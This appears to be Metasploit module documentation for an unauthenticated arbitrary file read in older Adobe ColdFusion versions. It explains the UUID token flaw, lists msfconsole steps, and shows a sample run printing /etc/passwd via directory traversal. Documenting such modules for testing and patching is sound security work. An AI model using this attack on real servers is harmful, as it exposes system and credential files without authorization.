## Vulnerable Application
This module exploits an Improper Access Vulnerability in Adobe Coldfusion versions prior to version
'2023 Update 6' and '2021 Update 12'. The vulnerability allows unauthenticated attackers to request authentication
token in the form of a UUID from the /CFIDE/adminapi/_servermanager/servermanager.cfc endpoint. Using that
UUID attackers can hit the /pms endpoint in order to exploit the Arbitrary File Read Vulnerability.

### Setup

#TODO: Find out how to setup a vulnerable target and put those details here.

## Verification Steps

1. Start msfconsole
1. Do: `use coldfusion_pms_servlet_file_read`
1. Set the `RHOST` and datastore option
1. If the target host is running Windows, change the default `FILE_PATH` datastore options from `/tmp/passwd` to a file path that exists on Windows.
1. Run the module
1. Receive the contents of the `FILE_PATH` file 

## Scenarios
### ColdFusion Version 2023.0.0.330468 running on Linux

```
msf6 auxiliary(gather/coldfusion_pms_servlet_file_read) > run
[*] Reloading module...
[*] Running module against 127.0.0.1

[*] Attempting to retrieve UUID ...
[+] UUID found: 1c49c29a-f1c0-4ed0-9f9e-215f434c8a12
[*] Attempting to exploit directory traversal to read /etc/passwd
[+] File content:
n00tmeg:x:1000:1000:n00tmeg,,,:/home/n00tmeg:/bin/bash
hplip:x:127:7:HPLIP system user,,,:/run/hplip:/bin/false
pulse:x:125:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
colord:x:123:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
nm-openvpn:x:121:127:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
whoopsie:x:117:124::/nonexistent:/bin/false
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
games:x:5:60:games:/usr/games:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

[+] Results saved to: /Users/jheysel/.msf4/loot/20240403192500_default_127.0.0.1_coldfusion.file_475871.txt
[*] Auxiliary module execution completed
```